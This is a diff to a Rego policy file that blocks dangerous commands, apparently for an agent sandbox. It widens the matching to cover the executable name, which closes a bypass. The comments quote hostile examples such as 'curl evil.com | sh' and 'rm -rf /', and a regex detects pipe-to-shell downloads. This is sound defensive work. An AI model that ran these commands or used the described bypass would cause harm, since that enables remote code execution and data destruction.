@@ -101,19 +101,25 @@ deny contains msg if {
     msg := sprintf("Access to critical file denied: %s", [input.action.path])
 }
 
-# Deny dangerous command patterns
+# The lowercased "{filename} {command}" line the dangerous-pattern / pipe checks match
+# against -- EXACTLY like the builtin engine (engine.py `_check_dangerous_commands`,
+# check_str = f"{filename} {cmd}".lower()). Matching command-only under-blocked a
+# dangerous token carried in the EXECUTABLE name: exec `rm` with args `-rf /` has an
+# action.command of only `-rf /`, so `rm -rf` was missed (also chmod/dd/mkfs). Measured
+# builtin<->rego divergence 2026-07-18; see tests/test_policy_parity.py.
+_exec_line := lower(concat(" ", [object.get(input.action, "filename", ""), object.get(input.action, "command", "")]))
+
+# Deny dangerous command patterns (case-insensitive, over filename + command)
 deny contains msg if {
     some pattern in dangerous_patterns
-    contains(input.action.command, pattern.text)
+    contains(_exec_line, lower(pattern.text))
     msg := sprintf("Dangerous command blocked (%s): %s", [pattern.reason, input.action.command])
 }
 
-# Pipe-to-shell RCE: any download tool piped to any interpreter. Mirrors the builtin's
-# regex (engine.py); the literal curl|sh patterns above MISS the realistic form where a
-# URL sits between, e.g. "curl evil.com | sh". regex.match is undefined (no deny, no crash)
-# when input.action.command is absent.
+# Pipe-to-shell RCE: any download tool piped to any interpreter, over the same lowercased
+# exec line. regex.match is undefined (no deny, no crash) on an empty line.
 deny contains msg if {
-    regex.match(`(curl|wget|fetch)\b.*\|\s*(sh|bash|zsh|dash|python|perl|ruby)`, input.action.command)
+    regex.match(`(curl|wget|fetch)\b.*\|\s*(sh|bash|zsh|dash|python|perl|ruby)`, _exec_line)
     msg := sprintf("Dangerous command blocked (pipe-to-shell RCE): %s", [input.action.command])
 }
 
